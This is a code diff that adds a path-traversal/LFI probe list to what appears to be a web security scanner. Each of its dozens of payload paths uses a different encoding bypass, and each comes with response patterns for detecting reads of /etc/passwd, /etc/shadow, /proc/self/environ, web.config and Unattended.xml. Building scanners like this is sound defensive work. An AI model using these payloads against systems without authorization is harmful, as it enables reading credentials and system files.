@@ -366,6 +366,230 @@ export const LOG_FILES: ProbePath[] = [
   },
 ];
 
+// ── 10. Path Traversal / LFI ──────────────────────────────────────────
+const PASSWD_PATTERNS = [/root:.*:0:0:/, /[\w-]+:x:\d+:\d+:/];
+const WIN_INI_PATTERNS = [/\[fonts\]/, /\[extensions\]/];
+
+export const PATH_TRAVERSAL: ProbePath[] = [
+  // ── /etc/passwd – encoding variants ───────────────────────────────
+  {
+    path: "../../../../../../../etc/passwd",
+    label: "Path Traversal: /etc/passwd (basic)",
+    severity: "error",
+    bodyPatterns: PASSWD_PATTERNS,
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+    label: "Path Traversal: /etc/passwd (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: PASSWD_PATTERNS,
+  },
+  {
+    path: "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    label: "Path Traversal: /etc/passwd (URL-encoded dots)",
+    severity: "error",
+    bodyPatterns: PASSWD_PATTERNS,
+  },
+  {
+    path: "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    label: "Path Traversal: /etc/passwd (fully URL-encoded)",
+    severity: "error",
+    bodyPatterns: PASSWD_PATTERNS,
+  },
+  {
+    path: "..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
+    label: "Path Traversal: /etc/passwd (double-encoded slash)",
+    severity: "error",
+    bodyPatterns: PASSWD_PATTERNS,
+  },
+  {
+    path: "....//....//....//....//....//....//....//etc/passwd",
+    label: "Path Traversal: /etc/passwd (non-recursive strip bypass)",
+    severity: "error",
+    bodyPatterns: PASSWD_PATTERNS,
+  },
+  {
+    path: "..;/..;/..;/..;/..;/..;/..;/etc/passwd",
+    label: "Path Traversal: /etc/passwd (Tomcat semicolon bypass)",
+    severity: "error",
+    bodyPatterns: PASSWD_PATTERNS,
+  },
+  {
+    path: "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
+    label: "Path Traversal: /etc/passwd (overlong UTF-8 slash)",
+    severity: "error",
+    bodyPatterns: PASSWD_PATTERNS,
+  },
+  {
+    path: "../../../../../../../etc/passwd%00",
+    label: "Path Traversal: /etc/passwd (null byte)",
+    severity: "error",
+    bodyPatterns: PASSWD_PATTERNS,
+  },
+  {
+    path: "../../../../../../../etc/passwd%00.html",
+    label: "Path Traversal: /etc/passwd (null byte + extension)",
+    severity: "error",
+    bodyPatterns: PASSWD_PATTERNS,
+  },
+
+  // ── windows/win.ini – encoding variants ───────────────────────────
+  {
+    path: "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
+    label: "Path Traversal: win.ini (backslash)",
+    severity: "error",
+    bodyPatterns: WIN_INI_PATTERNS,
+  },
+  {
+    path: "..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
+    label: "Path Traversal: win.ini (URL-encoded backslash)",
+    severity: "error",
+    bodyPatterns: WIN_INI_PATTERNS,
+  },
+  {
+    path: "..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows%5cwin.ini",
+    label: "Path Traversal: win.ini (double-encoded backslash)",
+    severity: "error",
+    bodyPatterns: WIN_INI_PATTERNS,
+  },
+  {
+    path: "../../../../../../../windows/win.ini",
+    label: "Path Traversal: win.ini (forward slash)",
+    severity: "error",
+    bodyPatterns: WIN_INI_PATTERNS,
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
+    label: "Path Traversal: win.ini (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: WIN_INI_PATTERNS,
+  },
+
+  // ── Secondary Linux targets (basic + URL-encoded slash) ───────────
+  {
+    path: "../../../../../../../etc/shadow",
+    label: "Path Traversal: /etc/shadow (basic)",
+    severity: "error",
+    bodyPatterns: [/root:\$[0-9a-z]+\$/, /[\w-]+:\$\d+\$/],
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow",
+    label: "Path Traversal: /etc/shadow (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: [/root:\$[0-9a-z]+\$/, /[\w-]+:\$\d+\$/],
+  },
+  {
+    path: "../../../../../../../etc/hosts",
+    label: "Path Traversal: /etc/hosts (basic)",
+    severity: "error",
+    bodyPatterns: [/127\.0\.0\.1\s+localhost/, /::1\s+localhost/],
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/hosts",
+    label: "Path Traversal: /etc/hosts (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: [/127\.0\.0\.1\s+localhost/, /::1\s+localhost/],
+  },
+  {
+    path: "../../../../../../../proc/self/environ",
+    label: "Path Traversal: /proc/self/environ (basic)",
+    severity: "error",
+    bodyPatterns: [/PATH=\//, /HOME=\//, /SERVER_SOFTWARE=/, /DOCUMENT_ROOT=/],
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/self/environ",
+    label: "Path Traversal: /proc/self/environ (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: [/PATH=\//, /HOME=\//, /SERVER_SOFTWARE=/, /DOCUMENT_ROOT=/],
+  },
+  {
+    path: "../../../../../../../proc/version",
+    label: "Path Traversal: /proc/version (basic)",
+    severity: "error",
+    bodyPatterns: [/Linux version \d+\.\d+/, /gcc/],
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/version",
+    label: "Path Traversal: /proc/version (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: [/Linux version \d+\.\d+/, /gcc/],
+  },
+  {
+    path: "../../../../../../../etc/os-release",
+    label: "Path Traversal: /etc/os-release (basic)",
+    severity: "error",
+    bodyPatterns: [/PRETTY_NAME=/, /VERSION_ID=/],
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/os-release",
+    label: "Path Traversal: /etc/os-release (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: [/PRETTY_NAME=/, /VERSION_ID=/],
+  },
+  {
+    path: "../../../../../../../etc/group",
+    label: "Path Traversal: /etc/group (basic)",
+    severity: "error",
+    bodyPatterns: [/root:.*:0:/, /[\w-]+:x:\d+:/],
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/group",
+    label: "Path Traversal: /etc/group (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: [/root:.*:0:/, /[\w-]+:x:\d+:/],
+  },
+
+  // ── Secondary Windows targets (basic + URL-encoded slash) ─────────
+  {
+    path: "../../../../../../../boot.ini",
+    label: "Path Traversal: boot.ini (basic)",
+    severity: "error",
+    bodyPatterns: [/\[boot loader\]/, /\[operating systems\]/],
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini",
+    label: "Path Traversal: boot.ini (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: [/\[boot loader\]/, /\[operating systems\]/],
+  },
+  {
+    path: "../../../../../../../windows/system32/drivers/etc/hosts",
+    label: "Path Traversal: Windows hosts file (basic)",
+    severity: "error",
+    bodyPatterns: [/127\.0\.0\.1\s+localhost/],
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/system32/drivers/etc/hosts",
+    label: "Path Traversal: Windows hosts file (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: [/127\.0\.0\.1\s+localhost/],
+  },
+  {
+    path: "../../../../../../../inetpub/wwwroot/web.config",
+    label: "Path Traversal: IIS web.config (basic)",
+    severity: "error",
+    bodyPatterns: [/<configuration>/, /<connectionStrings>/],
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2finetpub/wwwroot/web.config",
+    label: "Path Traversal: IIS web.config (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: [/<configuration>/, /<connectionStrings>/],
+  },
+  {
+    path: "../../../../../../../windows/Panther/Unattended.xml",
+    label: "Path Traversal: Unattended.xml (basic)",
+    severity: "error",
+    bodyPatterns: [/<Password>/, /<AutoLogon>/],
+  },
+  {
+    path: "..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/Panther/Unattended.xml",
+    label: "Path Traversal: Unattended.xml (URL-encoded slash)",
+    severity: "error",
+    bodyPatterns: [/<Password>/, /<AutoLogon>/],
+  },
+];
+
 export const ALL_CATEGORIES = [
   { name: "Environment & Secrets", paths: ENV_SECRETS },
   { name: "Version Control", paths: VERSION_CONTROL },
@@ -376,4 +600,5 @@ export const ALL_CATEGORIES = [
   { name: "Infrastructure Config", paths: INFRA_CONFIG },
   { name: "Source Code & Source Maps", paths: SOURCE_EXPOSURE },
   { name: "Log Files", paths: LOG_FILES },
+  { name: "Path Traversal / LFI", paths: PATH_TRAVERSAL },
 ] as const;
